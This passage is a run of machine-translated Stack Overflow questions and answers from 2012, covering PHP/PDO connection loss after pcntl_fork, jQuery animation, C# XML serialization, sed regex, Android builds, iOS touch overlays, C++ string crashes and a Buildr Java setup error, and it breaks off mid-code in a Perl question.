Many SQL implementations have a [Soundex](http://en.wikipedia.org/wiki/Soundex) function, but that works well (for some definition of "well") only for conventional Anglo-Saxon names (that were widely used a century ago). See [http://www.immagic.com/eLibrary/ARCHIVES/GENERAL/LAS_US/L030206B.pdf](http://www.immagic.com/eLibrary/ARCHIVES/GENERAL/LAS_US/L030206B.pdf) for some issues with Soundex.

# php - PDO/MySQL/PHP/OS X：MySQL 服务器在后续查询中消失了吗？

> ID：12587068
> 
> 赞同：0
> 
> 时间：2012-09-25T16:20:40.363
> 
> 标签：php, mysql, macos, pdo

我认为这是某处代码中的问题，但是代码太简单了，我不确定它可能是什么。

我已经验证 wait_timeout 足够高，并且已经完成了这里的所有操作：http: [//dev.mysql.com/doc/refman/5.1/en/gone-away.html](http://dev.mysql.com/doc/refman/5.1/en/gone-away.html)没有任何成功。

这在一个脚本运行中执行的第二个查询中重复发生，所以我确定这是一个编码错误。

我围绕 PDO 类创建了一个非常简单的包装器，以拥有一个单例数据库句柄：

```
<?php

class PDOWrapper
{
    protected static $instance;
    protected $dbh;

    function __construct()
    {
        if ( is_null(static::$instance) )
        {
            static::$instance = $this;
            $this->connect_to_db();
        }
    }

    static function instance()
    {
        if ( is_null(static::$instance) )
        {
            new static;
        }

        return static::$instance;
    }

    private function connect_to_db()
    {
        $db_info = array(
            0 => array(
                'hostname' => "Host",
                'username' => "User",
                'password' => "Pass",
                'db' => "DB",
            )
        );

        //Try to connect to the database
        try 
        {
            $dbh = new PDO('mysql:host=' . $db_info[0]['hostname'] . ';dbname=' . $db_info[0]['db'], $db_info[0]['username'], $db_info[0]['password'], array( PDO::ATTR_PERSISTENT => true, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_EMULATE_PREPARES => true ));
        }
        catch (PDOException $e)
        {
            log_message("Error connecting to DB!: " . $e->getMessage(), LOG_LEVEL_CRITICAL );
            return false;
        }

        $this->dbh = $dbh;
    }

    public static function get_dbh()
    {
        if ( is_null(static::$instance) )
        {
            new static;
        }

        return static::$instance->dbh;
    }
} 
```

然后我像这样使用包装器：

```
function somefunc(){
    $dbh = PDOWrapper::get_dbh();
    $future_sth = $dbh->prepare("SELECT * FROM some_table");
    $future_sth->execute();
    $ret = $future_sth->fetchAll(PDO::FETCH_ASSOC);
    print_r($ret);
    $future_sth->closeCursor();
    return $ret;
} 
```

作为事件循环的一部分，我反复调用此函数。第一次调用它时，print_r 运行良好，它会打印出我希望看到的行。

但是，在函数执行一次后，我得到以下信息：

```
Warning: Error while sending QUERY packet. PID=92871
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[HY000]: General error: 2006 MySQL server has gone away' 
```

我不知道为什么它会“消失”。我的 my.cnf 看起来不错。等待超时是巨大的，无论如何，只要我运行第二个查询，就会立即发生这种情况。有任何想法吗？

在 MySQL 错误日志中看起来没有任何明显错误：

```
120925 12:48:46 mysqld_safe Starting mysqld daemon with databases from /usr/local/var/mysql
120925 12:48:46 [Warning] The syntax '--log' is deprecated and will be removed in a future release. Please use '--general-log'/'--general-log-file' instead.
120925 12:48:46 [Warning] Setting lower_case_table_names=2 because file system for /usr/local/var/mysql/ is case insensitive
120925 12:48:46 InnoDB: The InnoDB memory heap is disabled
120925 12:48:46 InnoDB: Mutexes and rw_locks use GCC atomic builtins
120925 12:48:46 InnoDB: Compressed tables use zlib 1.2.5
120925 12:48:46 InnoDB: Initializing buffer pool, size = 128.0M
120925 12:48:46 InnoDB: Completed initialization of buffer pool
120925 12:48:46 InnoDB: highest supported file format is Barracuda.
120925 12:48:46  InnoDB: Waiting for the background threads to start
120925 12:48:47 InnoDB: 1.1.8 started; log sequence number 2273680401
120925 12:48:47 [Note] Server hostname (bind-address): '0.0.0.0'; port: 3306
120925 12:48:47 [Note]   - '0.0.0.0' resolves to '0.0.0.0';
120925 12:48:47 [Note] Server socket created on IP: '0.0.0.0'.
120925 12:48:47 [Note] Event Scheduler: Loaded 0 events
120925 12:48:47 [Note] /usr/local/Cellar/mysql/5.5.25a/bin/mysqld: ready for connections.
Version: '5.5.25a-log'  socket: '/tmp/mysql.sock'  port: 3306  Source distribution 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T21:00:08.777

我想到了。

我正在使用`pcntl_fork`. 父进程负责运行一个循环来查询数据库并派生子进程以根据它看到的数据执行额外的工作。

孩子们不需要数据库连接，但由于`pcntl_fork`使用过，他们仍然得到了一个。我只是`exit()`在子进程完成工作后杀死它们，这导致“友好”的 PHP 清理关闭了它认为孩子拥有的活动 MySQL 连接。

控制权将返回给父母，当他们试图在数据库中查找更多数据以发送给孩子时，他们会发现他们的数据库连接突然不再有效。

对我来说，解决方法是`posix_kill(getmypid(), 9);`用来杀死孩子，而不是`exit();`.

# javascript - easeOutBounce 效果并不总是适用

> ID：12587070
> 
> 赞同：1
> 
> 时间：2012-09-25T16:20:42.377
> 
> 标签：javascript, jquery, html

简单地说，当我点击一个按钮时，我有一个`div`动画，当我点击另一个按钮时，它应该是隐藏的：

```
<div id="popup"></div>
<input type="button" value="show and animate popup" onClick="showWithAnimation()" />
<input type="button" value="hide" onClick="aFunction()" />

<script>           
function showWithAnimation(){    

               console.log('animation called');
               $('#popup') .animate({top:(($(window).height()/2)-($('#popup').outerHeight()/2))-70}, 1000, 'easeOutBounce');
           $('#popup').show();
           }

         function aFunction(){//Hide the div

              $('#popup').hide();

          }
</script> 
```

我注意到的是，反弹效果`div`仅在我第一次单击时应用`show and animate popup`，然后当我单击`hide`按钮然后再次单击`show and animate popup`按钮时，`div`会显示，但没有`easeOutBounce`效果。我可以问你如何去解决这个问题吗？提前谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:39:12.990

动画没有发生的原因是因为 div 已经在它的最终目的地，所以当它试图动画到那个目的地时，它根本不会移动。

如果您不只是隐藏 div，而是将其动画回其原始位置，或者甚至在隐藏后让它跳回其原始位置，动画中的反弹将再次以您希望的方式发生。

此外，您需要在动画之前显示 div，而不是之后。

**其他一些注意事项：**

通常认为最好不要在 HTML 文件中使用内联代码。相反，您可能希望使用引用 id 或类的外部文件来应用事件处理程序。这不仅使您的 HTML 和 javascript 更易于阅读和遍历，而且允许在事后更轻松地进行更改。

*HTML 文件*

```
<script src="externaljsfile.js"></script>
<div id="popup"></div>
<input id="showButton" type="button" value="show and animate popup" />
<input id="hideButton" type="button" value="hide" /> 
```

*JS文件*

```
$( document ).ready( function() { // runs code once the DOM has loaded
   var $popup = $( '#popup' );

   $( '#showButton' ).click( function() {
      $popup.show();
      $popup.animate( {
         top: ( ( $( window ).height() / 2 ) - ( $popup.outerHeight() / 2 ) ) - 70
      }, 1000, 'easeOutBounce' );
   } );

   $( '#hideButton' ).click( function() {
      // move back to original position here.
      $popup.hide();
   } );
} ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:40:40.603

我认为这是因为当动画运行时，div 位于页面上的某个位置......但是当你重新运行它时，div 已经在目标位置......所以看起来没有动画/效果正在发生。它正在发生，它已经是你试图让它动画化的地方了。您需要首先将`top`和`left`样式设置为特定值......也许是窗口的顶部中间。然后，你`animate`就像你一样打电话。这样，每当您单击以显示弹出窗口时，弹出窗口的位置始终从同一位置开始，并在同一位置设置动画/结束。

所以你需要：

```
$("#popup").css({"top": "whatever", "left": "whatever"}).animate("whatever", "whatever", "whatever").show(); 
```

更新：

当您使用`animate`时，它实际上是根据其原始值对选定元素进行动画处理，以使您传递给它的属性。因此，在您的情况下，您正在为`top`和`left`样式设置动画。默认情况下，div 位于页面上的某个位置 - 我认为与您的一样，它是隐藏的，并且位于 HTML 中间的某个位置。所以从技术上讲，它是`top`并且`left`是未定义的，但实际上是一些有限的值，比如“200, 250”。当您调用 animate 时，它​​会逐渐将这些从原始 (200, 250) 更改为您在`animate`调用中指定的内容。所以，在 FIRST 之后`animate`调用，您将 div 移动（动画）到窗口的中心。然后您允许关闭（隐藏）弹出窗口。之后每次单击打开弹出窗口，它都会尝试将 div 移动（动画）到窗口的中心......但它已经存在（只是隐藏）。所以“没有”动画，因为它试图将 div 移动到它已经在的位置。同样，正如您在测试中注意到的那样，重要的是要注意这仅在第一次之后发生，因为 div 有已经被移动到它的目标位置。如果您打开弹出窗口，关闭它，调整窗口大小，然后再次打开弹出窗口，我敢肯定会有某种动画（至少可能）。`animate`

# c# - 带有隐式类型转换器的 XML 序列化失败

> ID：12587071
> 
> 赞同：1
> 
> 时间：2012-09-25T16:20:43.000
> 
> 标签：c#, .net, xml-serialization

以下代码会在 Windows 7 上引发运行时错误，但在 Windows 8 上不会。

```
public struct PointD
{
  public double X { get; set; }
  public double Y { get; set; }

  public static implicit operator PointD(Point point)
  {
    return new PointD() { X = point.X, Y = point.Y };
  }
}

var p = new PointD();
XmlSerializer serializer = new XmlSerializer(typeof(PointD));
using (var stream = File.Create("test.xml"))
  serializer.Serialize(stream, p); 
```

错误是：

```
Unable to generate a temporary class (result=1).
error CS0012: The type 'System.Drawing.Point' is defined in an assembly that is not referenced.
You must add a reference to assembly 'System.Drawing, Version=4.0.0.0, 
Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'. 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T21:32:13.497

我不知道问题的原因是什么，但我找到了解决它的方法：

替换此行

```
XmlSerializer serializer = new XmlSerializer(typeof(PointD)); 
```

像这样：

```
XmlSerializer serializer = new XmlSerializer(typeof(PointD), new Type[]{typeof(Point)}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:47:36.287

确保您的程序集和引用的 System.Drawing 程序集都具有相同的 .net 版本。当启动程序集设置为 .NET framework 4 Client Profile 并且 ref'd 程序集设置为 .NET framework 4（右键单击、属性、应用程序）时，我已经看到此错误

# playframework-2.0 - 如何在 Play Framework 2.0 中使用相对路径访问资源文件？

> ID：12587072
> 
> 赞同：3
> 
> 时间：2012-09-25T16:20:42.533
> 
> 标签：playframework-2.0

如何访问相对于 Play 应用程序路径的资源文件（即使打包到分发 zip 中）？

[这与此](https://stackoverflow.com/q/6430765/303106)问题相同，但在 Play 2 中，其 api 中没有 VirtualFile 类。

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-26T07:49:39.323

查看`play.api.Play.getFile()`and `play.api.Play.getExistingFile()`，它从相对于应用程序目录的文件系统中获取文件。

一种对我有用的类似技术只是将资源目录（或 jar）添加到 play start 脚本中的类路径中。然后我可以使用 Play.getResourceAsStream() 从该目录加载文件，或者在启动脚本中将资源指定为 JVM 参数（例如`-Dconfig.resource=/my_conf/prd.conf`）

# javascript - 有没有办法在 Javascript 中使用 IgnoreCase？

> ID：12587074
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:20:47.043
> 
> 标签：javascript, uppercase, lowercase

我想翻译一些单词，但是当我用大写或混合写 HOUSE 时遇到问题。当我用小写字母书写时它才起作用

```
<script>
var translate = prompt("Enter one of the next words:\nhouse\ntable\ndog\ncat");

switch (translate){
    case 'house': document.write("casa");
        break;
    case 'table': document.write("mesa");
        break
    case 'dog': document.write("perro");
        break;
    case 'cat': document.write("gato");
        break;
    default: document.write("Error");

}
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:31:13.683

修改后的代码。（正如评论中已经给出的解决方案。）

```
<script>
var translate = prompt("Enter one of the next words:\nhouse\ntable\ndog\ncat") || ''; // take '' if user cancel the prompt as it return `null`;
translate  = translate.toLowerCase();
switch (translate){
    case 'house': document.write("casa");
        break;
    case 'table': document.write("mesa");
        break
    case 'dog': document.write("perro");
        break;
    case 'cat': document.write("gato");
        break;
    default: document.write("Error");

}
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:24:10.303

使用类似 toLowercase()

```
mystr="Hello WORLD !";
document.write(mystr.toLowerCase()); 
```

会给“你好世界”

将此应用于您的翻译变量

参考：[https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/toLowerCase](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/toLowerCase)

# regex - 试图在 sed 中寻找“（”

> ID：12587075
> 
> 赞同：1
> 
> 时间：2012-09-25T16:20:48.100
> 
> 标签：regex, unix, sed

这可能是一个愚蠢的问题，但`(` `)`sed 支持？我知道`\\(`并`\\)`持有它们之间的内容，因此您可以通过`\1`或任何数字访问它。我需要一个正则表达式来查找括号并保存它们之间的内容。

```
sed 's/.*( .* \([[:alnum:]]+\) *).*/\1/' file 
```

所以我正在寻找这个：

> 可能是一些东西（可能是一些东西 [字母或数字] 可能是一些东西）

我需要找到外部`()`s，但你不能找到`\`它们，否则它认为你想保存里面的东西。基本上我只需要找到`()`s 就可以在其中保存一些东西。

我将继续寻找如何做到这一点，但如果你们中的任何人知道它会如何真正帮助我。我尝试使用`""`and `''`，除非我使用了某种不起作用的不正确语法。感谢您提供任何帮助。

编辑：具体示例：我想要：

```
 aname = (type name){ value, value }. 
```

我想知道如何在 sed 中专门寻找 ()s 和 {}，因为它们还有其他含义。我假设 \{ 和 \} 是您获得 {} 的方式，但我不确定如何获得 ()。我也知道前面的 sed 表达式不会找到，这只是我写下的一个简单示例，以表明我想在正则表达式中查找 ()。如果我造成任何混乱，我很抱歉。只是让你们可以看到这是我当前的正则表达式：

```
 start line   aname        =          (        type           name    )         { values }; 

    sed 's/^\([[:alnum:]]\)+ *={1} *[^()]({1} *[[:alnum:]]+ +\([[:alnum:]]\)+ *) *\{{1}\(.*\)\};/init_\2\( \&\1, \3)/' file 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:33:08.810

sed（和其他使用 Posix 基本正则表达式的实用程序）没有赋予任何特殊含义`(`，`)`因此您可以像使用任何其他字符一样使用它们。`\(`并且`\)`是组分隔符。

BRE真的应该死。很久很久以前，Posix 定义了“扩展”正则表达式 (ERE)，其中分组分隔符是`(`and`)`并且您使用`\(`and`\)`来匹配括号，这更加直观。`{`BRE 和 ERE 处理和`}`（数字重复运算符）之间存在类似的差异。ERE 还包括`|`and`+`运算符。

`grep`并且`sed`两者都默认使用 BRE，但可以说服使用带有正确命令行标志的 ERE：`grep -E`和`sed -r`. gawk 使用带有一些 GNU 扩展和一些与标准的偏差的 ERE，包括如果你想使用`{`and必须指定 --re-interval 的事实`}`。[咆哮]有时让我感到惊讶的是，我们容忍所有这些精神错乱。应该只有一个正则表达式标准，所有实用程序都应该毫无例外地使用它。[/rant]

如果您的正则表达式使用`(`并且`)`未按预期工作，请提供其失败的模式的具体示例以及您的预期结果。我的怀疑是它与您的模式中的空格字符有关，如果这实际上是您正在使用的模式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:28:21.723

我认为您的问题是第一个 .* 模式采用的贪婪匹配。

尝试用 [^()]* 替换它以排除括号：

```
bash$ echo 'xxx(123)yyy' | sed -e 's/[^()]*(\([[:alnum:]]*\))[^()]*/\1/' ->
123 
```

# android - 构建 Android 应用时指定包名

> ID：12587077
> 
> 赞同：4
> 
> 时间：2012-09-25T16:20:56.003
> 
> 标签：android, ant

我有一个品牌化的 Android 应用程序。我们使用的是 SDK v15 (4.0.x)，当通过 ant 构建应用程序时，我们会在 ant 属性脚本中指定 package.name=com.blah.brand。这将允许我们在设备上多次安装相同的应用程序，但每个应用程序都是它自己的应用程序和设置。

由于升级到 SDK v16 (4.1)，这不再有效，我无法在构建应用程序时找到更改打包名称的方法。有谁知道如何做到这一点的新方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:50:43.493

我可以通过 aapt 和 --rename-manifest-package 来做到这一点，如下所述：[Custom Android build.xml for rename manifest package](https://stackoverflow.com/questions/3360349/custom-android-build-xml-for-rename-manifest-package)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-22T09:53:03.940

您也可以修改您的 ant build.xml。将其添加到其中：

```
<target name="-package-resources" depends="-crunch">
        <do-only-if-not-library elseText="Library project: do not package resources..." >
            <echo level="info">packagin resources for package: ${project.app.package}</echo>
            <aapt executable="${aapt}"
                    command="package"
                    versioncode="${version.code}"
                    versionname="${version.name}"
                    debug="${build.is.packaging.debug}"
                    manifest="${out.manifest.abs.file}"
                    assets="${asset.absolute.dir}"
                    androidjar="${project.target.android.jar}"
                    apkfolder="${out.absolute.dir}"
                    nocrunch="${build.packaging.nocrunch}"
                    resourcefilename="${resource.package.file.name}"
                    resourcefilter="${aapt.resource.filter}"
                    libraryResFolderPathRefid="project.library.res.folder.path"
                    libraryPackagesRefid="project.library.packages"
                    libraryRFileRefid="project.library.bin.r.file.path"
                    previousBuildType="${build.last.target}"
                    buildType="${build.target}"
                    ignoreAssets="${aapt.ignore.assets}"
                    manifestpackage="NEW PACKAGE NAME HERE">
                <res path="${out.res.absolute.dir}" />
                <res path="${resource.absolute.dir}" />
            </aapt>
        </do-only-if-not-library>
    </target> 
```

属性**manifestpackage**将更改您的包名称。

# ios - 如何在 iOS 模拟器等应用程序中实现“指纹追踪”层

> ID：12587079
> 
> 赞同：1
> 
> 时间：2012-09-25T16:21:06.153
> 
> 标签：ios, uiview, touch-event

现在我们的应用已经发货了，我们的培训负责人有一个要求：

“该应用程序很酷，但我们需要一种显示手指运动的模式，例如手势在模拟器中的显示方式或 iPad 在 Keynote 中的激光笔模式[这样我们就可以拍摄电影]。”

这是一个使用 UITabBarController 和每个选项卡 (4) 的 xibs 的应用程序。这是一个带有交互手势识别器的非常复杂的应用程序，我正在做“首先，不要伤害”的噩梦......

我尝试使用此处的方案在选项卡控制器上方添加一个简单的“全局 UIView”：[http ://www.james-vandyne.com/creating-universal-overlays-using-uiviews-on-ios/](http://www.james-vandyne.com/creating-universal-overlays-using-uiviews-on-ios/)

我的“PresentationView”尝试：

在我的应用委托中：

```
UIWindow *mainWindow = [[UIApplication sharedApplication] keyWindow];
[self setPresentationView:[[PresentationView alloc] initWithFrame: [mainWindow frame]]];
[mainWindow insertSubview:presentationView aboveSubview:mainWindow]; 
```

班上：

```
//  PresentationView.h
#import <UIKit/UIKit.h>

@interface PresentationView : UIView
{
    NSMutableDictionary *touchesInView;
}
@property (nonatomic, retain) NSMutableDictionary *touchesInView;
@end

#import "PresentationView.h"
#import "TouchPoint.h"

@implementation PresentationView
@synthesize touchesInView;

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code
        [ self setAlpha:0.1];
        [self setBackgroundColor:[UIColor whiteColor]];

        [self setUserInteractionEnabled:YES];
        [self setMultipleTouchEnabled:YES];
        touchesInView = [[NSMutableDictionary alloc] init];
    }
    return self;
}

- (void) dealloc
{
    [touchesInView release];
    touchesInView = nil;

    [super dealloc];
}

- (void)drawRect:(CGRect)rect
{
    if ([touchesInView count] < 1)
        return;

    CGContextRef context = UIGraphicsGetCurrentContext();
    NSEnumerator *touchEnum = [touchesInView objectEnumerator];
    TouchPoint *nextTouch;
    float rad = 24;

    while (nextTouch = [touchEnum nextObject]) {
        [[ UIColor redColor] set];
        CGContextAddArc(context, nextTouch.current.x, nextTouch.current.y, rad, 0.0, M_PI*2, 1);
        CGContextFillPath(context);
        CGContextStrokePath(context);
    }
}

- (UIView *) hitTest:(CGPoint)point withEvent:(UIEvent *)event
{
    [self setNeedsDisplay];

    return [[[[[UIApplication sharedApplication] keyWindow] subviews] objectAtIndex:0] hitTest:point withEvent:event];
}

- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
    for( UITouch *t in touches )
    {
        NSValue *key = [NSValue valueWithPointer:t];
        CGPoint loc = [t locationInView:self];
        TouchPoint *newTouch = [[TouchPoint alloc] init];

        [newTouch setBegan:loc];
        [newTouch setCurrent:loc];
        [newTouch setTapCount:[t tapCount]];

        [touchesInView setObject:newTouch forKey:key];

        [newTouch release];
    }
    [self setNeedsDisplay];

    [[[[[UIApplication sharedApplication] keyWindow] subviews] objectAtIndex:0] touchesBegan:touches withEvent:event];
}
// More touch methods- all ignored 
```

这有点工作 - 视图位于所有其他视图之上，并且`hitTest:withEvent:`会触发，并且我成功地在`drawRect:`.

但是当我尝试跟踪触摸时它会崩溃`touchesBegan/Moved/Ended`- 不要开火。（是的，我已经开启`UserInteractionEnabled`了`setMultipleTouchEnabled`这个全局视图）。幸运的是，我没有在下面的任何事情上搞砸手势识别 - 其他视图正在获取事件，并且应用程序在此全局视图下正常运行。

通常我使用 IB 来构建/定位视图，而不是从头开始在代码中构建它们，所以很可能有（一个？/几个？）简单的 UIView 属性我没有设置正确......但我不能看见。还是我会让自己陷入困境，试图将事件沿着链条转发？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:48:56.743

有一个很好的框架叫做 FingerTips 可以做到这一点。

它也很容易实现，如果有外部显示器，它只会显示圆圈，以便您展示它。

# c++ - 应用程序在第一次 strcat_s 崩溃

> ID：12587086
> 
> 赞同：0
> 
> 时间：2012-09-25T16:21:15.240
> 
> 标签：c++, file, search, crash, strcat-s

我已经尝试过 strcat 和 strcat_s，但它们都崩溃了。有谁知道为什么会这样？我找不到问题。

```
Crash: "Unhandled exception at 0x58636D2A (msvcr110d.dll)"
_Dst        0x00ea6b30  "C:\\Users\\Ruben\\Documents\\School\\" char *
_SizeInBytes    260                         unsigned int
_Src        0x0032ef64  "CKV"                   const char *
available       228                         unsigned int
p           0x00ea6b50  ""                  char * 
```

代码：

```
#include <Windows.h>
#include <strsafe.h>

extern "C"
{
    char* GetFilesInFolders(LPCWSTR filedir, char* path)
    {
        char* files = "";

        char DefChar = ' ';
        char* Streepje = "-";
        bool LastPoint = false;

        WIN32_FIND_DATA ffd;
        TCHAR szDir[MAX_PATH];
        HANDLE hFind = INVALID_HANDLE_VALUE;
        DWORD dwError = 0;

        StringCchCopy(szDir, MAX_PATH, filedir);
        hFind = FindFirstFile(szDir, &ffd);

        if (INVALID_HANDLE_VALUE == hFind) 
            return "";

        do
        {
            DWORD attributes = ffd.dwFileAttributes;
            LPCWSTR nm = ffd.cFileName;
            char name[260];
            WideCharToMultiByte(CP_ACP,0,ffd.cFileName,-1, name,260,&DefChar, NULL);

            for (int i = 0; i <= 260; i++)
            {
                if (name[i] == '.')
                    LastPoint = true;
                else if (name[i] == ' ')
                    break;
            }

            if (LastPoint == true)
            {
                LastPoint = false;
                continue;
            }

            if (attributes & FILE_ATTRIBUTE_HIDDEN)
            {
                continue;
            }
            else if (attributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                char* newfiledir = "";
                char* newpath = path;
                char* add = "\\";
                char* extra = "*";
                strcat_s(newpath, sizeof(name), name);
                strcat_s(newpath, sizeof(add), add);
                puts(newpath);
                strcpy_s(newfiledir, sizeof(newpath) + 1, newpath);
                strcat_s(newfiledir, sizeof(extra) + 1, extra);
                puts(newfiledir);

                size_t origsize = strlen(newfiledir) + 1;
                const size_t newsize = 100;
                size_t convertedChars = 0;
                wchar_t wcstring[newsize];
                mbstowcs_s(&convertedChars, wcstring, origsize, newfiledir, _TRUNCATE);
                LPCWSTR dir = wcstring;
                GetFilesInFolders(dir, newpath);
            }
            else
            {
                char* file = path;
                strcat_s(file, sizeof(name), name);
                puts(file);
                strcat_s(files, sizeof(file), file);
                strcat_s(files, sizeof(Streepje), Streepje);
                puts(files);
            }
        }
        while (FindNextFile(hFind, &ffd) != 0);

        FindClose(hFind);
        return files;
    }
}

int _tmain(int argc, _TCHAR* argv[])
{
    char* path = "C:\\Users\\Ruben\\Documents\\School\\";
    char* filedir = "C:\\Users\\Ruben\\Documents\\School\\*";
    size_t origsize = strlen(filedir) + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t wcstring[newsize];
    mbstowcs_s(&convertedChars, wcstring, origsize, filedir, _TRUNCATE);
    LPCWSTR dir = wcstring;
    char* files = GetFilesInFolders(dir, path);
    return 0;
} 
```

额外信息：我不想使用 boost 或字符串，我想将其保存为 unicode（默认）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T16:25:59.023

您分配一个`const char*`to `files`，然后尝试附加到它。

```
char* files = "";
// ... 
strcat_s(files, sizeof(file), file); 
```

您不能修改常量字符串文字。

我建议您打开编译器警告并确保查看它们。这会警告您将 a 分配`const char*`给 a `char*`。要修复它，您可能已更改`files`为 be `const`，这将导致您`strcpy_s`不再编译。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:52:58.087

看起来您不了解变量如何存储在内存中或指针如何工作。在您的文件`_tmain()`中，您`char * path`指向一个常量字符串文字，您将其传递给`GetFilesInFolders()`，并在其中对其进行修改。编译器倾向于允许`char *`s 指向常量字符串以向后兼容旧的 C 程序。您不能修改这些。您不能附加到它们。编译器（通常）将它们放在只读段中。这就是您遇到异常的原因之一。

你的整体`GetFilesInFolders()`是错误的。正如 DarkFalcon 指出的那样，你没有在任何地方为 分配任何空间`files`，你让它指向一个常量字符串文字。

获取“C++ 编程语言”并阅读第 5 章。

# c++ - 使用相同的键有效地迭代多个映射

> ID：12587087
> 
> 赞同：0
> 
> 时间：2012-09-25T16:21:23.340
> 
> 标签：c++, optimization, map, iteration

如果我有两个保证具有完全相同的键集的映射，我怎样才能有效地遍历两个映射？

例如，假设我有以下地图：

```
std::map<std::string, int> iMap;
std::map<std::string, std::vector<int> > vMap; 
```

在某些时候，它们最终都会得到完全相同的一组键。我现在需要`vMap`根据相应的值更新 的所有值`iMap`。首先想到的是这样的：

```
typedef map<string, int> map_t;
BOOST_FOREACH(map_t::value_type &p, iMap) {
  vMap[p.first].push_back(p.second);
} 
```

`vMap[n]`然而，考虑到我们正在有效地按顺序遍历键，我们必须查找每个值似乎相当浪费。我们有什么办法可以利用这一点吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T16:24:05.483

如果您绝对确定键是相同的，则可以同步遍历两个映射：

```
auto it1 = iMap.begin();
auto it2 = vMap.begin();

while (it1 != iMap.end())
{
    it2->second.push_back(*it1);
    ++it1;
    ++it2;
} 
```

# macos - Buildr 抱怨 javac：无效的源版本：1.7

> ID：12587089
> 
> 赞同：4
> 
> 时间：2012-09-25T16:21:35.417
> 
> 标签：macos, build, javac, openjdk, buildr

我遇到了 Apache 的 Buildr 抱怨源版本无效的问题。每当我尝试构建我的项目时，我都会收到以下错误消息；

```
javac: invalid source release: 1.7
Usage: javac <options> <source files>
use -help for a list of possible options
Buildr aborted!
RuntimeError : Failed to compile, see errors above 
```

有人会假设我的系统上没有安装 Java 7，但是当我执行时`javac -version`我得到`javac 1.7.0-u10-b08`了，这是我刚刚安装的 OpenJDK。

这里发生了什么？我的第一个猜测是 Buildr 运行了错误的 Java 版本，但我不知道如何修复或确认。

为了给这个问题提供一些背景知识，我正在运行 Mac OS X 版本 8（Mountain Lion）并从[http://code.google.com/p/openjdk-osx-build/](http://code.google.com/p/openjdk-osx-build/)安装了 OpenJDK 。我正在使用 RVM 来管理 Ruby，并`env JAVA_HOME=$JAVA_HOME gem install buildr`按照文档中的建议安装了 Buildr。我的 JAVA_HOME 设置为`/Library/Java/JavaVirtualMachines/1.7.0u.jdk/Contents/Home`，这是我安装 OpenJDK 的位置。

如果有人可以在这里帮助我，我将不胜感激。

**更新：** 看起来 Buildr 只是不尊重我的 JAVA_HOME。我进入并取消选中 Java Preferences 中的 Java 系统版本（版本 6），现在我得到一个不同的错误，

```
JavaVM: requested Java version ((null)) not available. Using Java at "" instead.
JavaVM: Failed to load JVM: /bundle/Libraries/libserver.dylib
JavaVM FATAL: Failed to load the jvm library.
Buildr aborted!
RuntimeError : can't create Java VM 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T22:06:53.053

我看了一下这个，它看起来是一个与 OSX 上的 RJB 工作方式有关的错误。RJB 是 Buildr 用来与 JVM 交互的库。本质上 RJB 似乎不允许在不设置一些环境变量的情况下配置 JVM（可能在构建时？）。请参阅[http://rjb.rubyforge.org/](http://rjb.rubyforge.org/)。

有两种主要方法可以解决此问题；

*   通过在构建文件中添加类似“compile.using(:externaljavac)”的内容来使用外部编译器。
*   使用 JRuby。

我将研究下一个版本（1.4.8）正确解决此问题所需的内容。

**更新**

已在 1.4.8 中修复 - 1.4.7 的解决方法是设置 JVM_LIB 环境变量，如

```
export JVM_LIB=$JAVA_HOME/jre/lib/server/libjvm.dylib 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T19:31:50.620

这与其说是一个答案，不如说是一种解决方法。我让构建工作，但只有在我安装并使用 JRuby 而不是 Ruby（CRuby？我更像是一个 Python 人）之后。

根据我的研究，1.7 JVM 似乎在 Mac OS X 下引起了很多问题。Eclipse 似乎遇到了一个非常类似的问题，即平台不会开始使用 Java Preferences 和 JAVA_HOME 中特定的 JVM。希望在某个时候这些问题会得到解决，但现在看来 JRuby 是一个很好的解决方法。

TLDR；使用 JRuby。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T23:26:43.813

这看起来像一个构建器问题。从历史上看，我们使用预定路径检测 Mac 上的 Java 主文件夹。我猜它会覆盖 JAVA_HOME。对此进行测试会很好。

如果您在 Buildr 错误跟踪系统上提交错误，我们可以查看它。

# perl - 有没有办法从切片列表中构建匿名 hashref？

> ID：12587091
> 
> 赞同：1
> 
> 时间：2012-09-25T16:21:37.387
> 
> 标签：perl

当组合来自几个 arrayrefs 的特定数据时，我按照以下代码映射了转换：

```
my @output_data = map {
  my $ss = $everything->{$_->{username}};
  my $distance = $gis->distance ( $_->{lat}, $_->{long} => $ss->{Latitude}, $ss->{Longitude} );
  my %data;
  @data{qw/username addr1 addr2 city state zip rec_lat rec_long/} = @{$_}{qw/username addr1 addr2 city state zip lat long/};
